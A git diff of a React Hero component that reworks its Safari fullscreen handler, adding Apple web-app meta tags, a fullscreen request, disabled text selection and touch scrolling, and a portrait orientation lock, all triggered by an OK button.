@@ -5,58 +5,73 @@ import Setting from '../assets/Settings1.webp'
 const Hero = () => {
     const [isFullscreen, setIsFullscreen] = useState(false);
 
-    // Function to lock orientation to portrait (iOS Safari)
-    const lockOrientation = () => {
-        try {
-            if (window.screen.orientation && window.screen.orientation.lock) {
-                window.screen.orientation.lock('portrait');
-            }
-        } catch (error) {
-            console.log('Orientation lock not supported');
-        }
-    };
-
-    // Handle Safari fullscreen
-    const enterFullscreen = () => {
+    // Function to handle Safari fullscreen
+    const handleSafariFullscreen = () => {
+        // Set fullscreen state
         setIsFullscreen(true);
+
+        // Add Safari-specific meta tags
+        const metaTags = [
+            { name: 'apple-mobile-web-app-capable', content: 'yes' },
+            { name: 'apple-mobile-web-app-status-bar-style', content: 'black-translucent' },
+            { name: 'viewport', content: 'width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no' }
+        ];
+
+        metaTags.forEach(tag => {
+            let meta = document.querySelector(`meta[name="${tag.name}"]`);
+            if (!meta) {
+                meta = document.createElement('meta');
+                meta.name = tag.name;
+                meta.content = tag.content;
+                document.head.appendChild(meta);
+            }
+        });
+
+        // Safari-specific body adjustments
+        document.body.style.setProperty('-webkit-user-select', 'none', 'important');
+        document.body.style.setProperty('user-select', 'none', 'important');
+        document.body.style.setProperty('-webkit-touch-callout', 'none', 'important');
         
-        // Add meta tags for proper Safari fullscreen
-        const meta = document.createElement('meta');
-        meta.name = 'apple-mobile-web-app-capable';
-        meta.content = 'yes';
-        document.getElementsByTagName('head')[0].appendChild(meta);
+        // Force Safari to enter fullscreen mode
+        if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen();
+        }
 
-        // Force viewport settings
-        const viewport = document.querySelector("meta[name=viewport]");
-        viewport.setAttribute('content', 
-            'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover');
-
-        // Apply fullscreen styles
-        document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
-        document.body.style.setProperty('overflow', 'hidden', 'important');
-        document.body.style.setProperty('position', 'fixed', 'important');
-        document.body.style.setProperty('width', '100%', 'important');
-        document.body.style.setProperty('min-height', '100vh', 'important');
-        document.body.style.setProperty('min-height', '-webkit-fill-available', 'important');
-
-        // Lock orientation
-        lockOrientation();
-
-        // Hide Safari UI
+        // Hide Safari UI by scrolling slightly
         setTimeout(() => {
             window.scrollTo(0, 1);
         }, 100);
+
+        // Prevent default touch behaviors
+        document.addEventListener('touchmove', (e) => {
+            e.preventDefault();
+        }, { passive: false });
+
+        // Lock orientation if possible
+        if (window.screen && window.screen.orientation) {
+            try {
+                window.screen.orientation.lock('portrait');
+            } catch (err) {
+                console.log('Orientation lock not supported');
+            }
+        }
     };
 
     return (
-      <div className={`relative font-geologica ${
-        isFullscreen 
-          ? 'fixed inset-0 bg-white min-h-screen h-screen w-screen z-[9999] overflow-hidden' 
-          : 'px-6 py-8 max-w-4xl mx-auto'
-        } md:px-8 lg:px-10`}
+      <div 
+        className={`${
+          isFullscreen 
+            ? 'fixed inset-0 bg-white z-[9999] min-h-screen w-screen overflow-hidden' 
+            : 'px-6 py-8 max-w-4xl mx-auto'
+        } relative font-geologica md:px-8 lg:px-10`}
         style={isFullscreen ? {
-            height: 'calc(var(--vh, 1vh) * 100)',
-            WebkitOverflowScrolling: 'touch'
+            height: '-webkit-fill-available',
+            minHeight: '-webkit-fill-available',
+            WebkitOverflowScrolling: 'touch',
+            touchAction: 'none',
+            WebkitTouchCallout: 'none',
+            WebkitUserSelect: 'none',
+            WebkitTapHighlightColor: 'transparent'
         } : {}}
       >
         <h1 className="text-[18px] before:leading-[28px] text-ligh-red font-normal mb-[24px] md:text-[20px] lg:text-[22px]">
@@ -99,7 +114,7 @@ const Hero = () => {
           </div>
           
           <button 
-            onClick={enterFullscreen}
+            onClick={handleSafariFullscreen}
             className="w-full bg-[#ff4b4b] !text-whitish py-2 rounded-lg hover:bg-[#ff3b30] transition-colors text-xs md:text-sm"
           >
             OK
@@ -129,7 +144,7 @@ const Hero = () => {
         <div className="fixed bottom-16 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
                 md:w-[320px] lg:w-[360px] md:bottom-20">
           <button 
-            onClick={enterFullscreen}
+            onClick={handleSafariFullscreen}
             className="w-full py-2.5 text-center text-sm font-medium"
           >
             OK
